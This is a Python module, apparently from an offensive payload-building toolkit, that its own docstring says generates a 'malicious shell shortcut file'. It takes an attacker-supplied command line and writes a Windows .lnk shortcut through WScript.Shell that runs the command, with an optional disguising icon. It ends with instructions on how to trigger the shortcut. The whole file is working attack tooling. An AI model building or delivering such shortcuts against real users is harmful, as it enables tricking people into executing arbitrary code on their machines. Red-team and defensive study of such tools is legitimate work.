#!/usr/bin/env python
# encoding: utf-8
import sys
import logging
from modules.payload_builder import PayloadBuilder
from collections import OrderedDict
if sys.platform == "win32":
    from win32com.client import Dispatch  # @UnresolvedImport


class LNKGenerator(PayloadBuilder):
    """ Module used to generate malicious shell shortcut file"""
    
    def check(self):
        if sys.platform != "win32":
            logging.error("  [!] You have to run on Windows OS to build this file format.")
            return False
        
        if not self.mpSession.htaMacro:
            # Get needed parameters
            paramDict = OrderedDict([("Command line",None) ]) # ("Work_Directory",None)      
            self.fillInputParams(paramDict)
            
            #workingDirectory = paramDict["Work_Directory"]
            # Extract shortcut arguments
            self.mpSession.dosCommand = paramDict["Command line"]

        return True
    
        
    def printFile(self):
        """ Display generated code on stdout """
        logging.info(" [+] Generated CMD line:\n")
        print(self.mpSession.dosCommand)
        
        
    def buildLnkWithWscript(self, target, targetArgs=None, iconPath=None, workingDirectory = ""):
        """ Build an lnk shortcut using WScript wrapper """
        shell = Dispatch("WScript.Shell")
        
        shortcut = shell.CreateShortcut(self.outputFilePath)
        logging.debug("    ['] Shortcut target: %s" % target)
        shortcut.Targetpath = target
        logging.debug("    ['] Shortcut WorkingDirectory: %s" % workingDirectory)
        shortcut.WorkingDirectory = workingDirectory
        if targetArgs:
            logging.debug("    ['] Shortcut args: %s" % targetArgs)
            shortcut.Arguments = targetArgs
        if iconPath:
            logging.debug("    ['] Shortcut icon: %s" % iconPath)
            shortcut.IconLocation = iconPath
        shortcut.save()
        
    
    def generate(self):
        """ Generate LNK file """
        logging.info(" [+] Generating %s file..." % self.outputFileType)
        targetArgs = None
        CmdLine = self.mpSession.dosCommand.split(' ', 1)
        target = CmdLine[0]
        if len(CmdLine) == 2:
            targetArgs = CmdLine[1]
        
        # Create lnk file
        self.buildLnkWithWscript(target, targetArgs, self.mpSession.icon) # ("Work_Directory",None)
        
        logging.info("   [-] Generated %s file: %s" % (self.outputFileType, self.outputFilePath))
        logging.info("   [-] Test with: \nBrowse %s dir to trigger icon resolution. Click on file to trigger shortcut.\n" % self.outputFilePath)
        

        
        
        